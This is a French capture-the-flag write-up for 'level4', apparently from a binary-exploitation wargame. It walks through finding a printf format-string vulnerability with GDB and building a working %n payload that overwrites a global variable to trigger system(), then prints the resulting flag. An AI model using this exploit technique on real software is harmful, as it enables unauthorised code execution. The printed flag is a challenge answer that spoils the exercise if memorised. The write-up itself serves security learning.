### Level 4

## Etape 1: Observation initiale du comportement

- On lance le programme pour voir ce qu'il fait:

```bash
./level4
test
test
```

- Le programme lit une entrée et l'affiche

```bash
./level4
%p
0xb7ff26b0
./level4
%x
b7ff26b0
```

- Le %px etc est interprété
- Le programme utilise printf() sans format fixe

## Etape 2: Analyse statique avec GDB

- Desassemblons pour comprendre la structure:

```bash
gdb ./level4
(gdb) disas main
[...]
   0x080484ad <+6>:	call   0x8048457 <n>
[...]
```

- On voit que main() appelle simplement une fonction n():

```bash
(gdb) disas n
```

- Points clés dans la fonction n():
1. Elle appelle fgets()
2. Elle appelle une fonction p() avec notre input
3. Elle compare une valeur en mémoire avec 0x1025544

```bash
0x08048488 <+49>:	call   0x8048444 <p>
0x0804848d <+54>:	mov    0x8049810,%eax
0x08048492 <+59>:	cmp    $0x1025544,%eax
0x08048497 <+64>:	jne    0x80484a5 <n+78>
0x08048499 <+66>:	movl   $0x8048590,(%esp)
0x080484a0 <+73>:	call   0x8048360 <system@plt>
```
 
- Le programme lit la valeur (m) à l'adresse 0x8049810 
- Il compare la valeur (m) avec 0x1025544 (16930116 en décimal)
- Si égal: il exécute system() avec un argument
- Sinon: le programme se termine

- On regarde la fonction p():

```bash
(gdb) disas p
```

```bash
[...]
0x0804844a <+6>:	mov    0x8(%ebp),%eax
0x0804844d <+9>:	mov    %eax,(%esp)
0x08048450 <+12>:	call   0x8048340 <printf@plt>
[...]
```

- p() appelle printf() directement avec notre input comme format str

## Etape 3: Exploitation: Trouver la position sur la stack

- Comme level3, on doit trouver ou notre input apparait sur la stack:

```bash
./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff754 b7fd0ff4 0 0 bffff718 804848d bffff510 200 b7fd1ac0 b7ff37d0 41414141
```

41414141 = "AAAA" en hexadecimal: notre input est à la 12eme position

## Etape 4: Construction du payload

- Pour exploiter avec %n, on a besoin de :

```
[ADDR_CIBLE] + [PADDING] + [%n a la bonne position]
```

Calcul:
- Adresse cible: 0x8049810 (en little-endian: \x10\x98\x04\x08)
- Valeur à écrire: 16930116 (valeur comparé)
- On ecrit deja 4 bytes (l'adresse): il faut écrire encore 16930116 - 4 = 16930112 (chars)
- Position : 12

- Payload final:
```python
python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"
```

Decomposition:
- \x10\x98\x04\x08: l'adresse de m
- %16930112u: affiche un nombre sur 16930112 caractères (padding)
- %12$n: ecrit le nombre total de caractsres affichés a l'adresse en 12eme position (notre adresse)

## Etape 5: Exploitation

```bash
(python -c "print('\x10\x98\x04\x08' + '%16930112u' + '%12\$n')"; cat) | ./level4
```

- Le ;cat garde stdin ouvert pour que le shell reste interactif

- Flag:
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a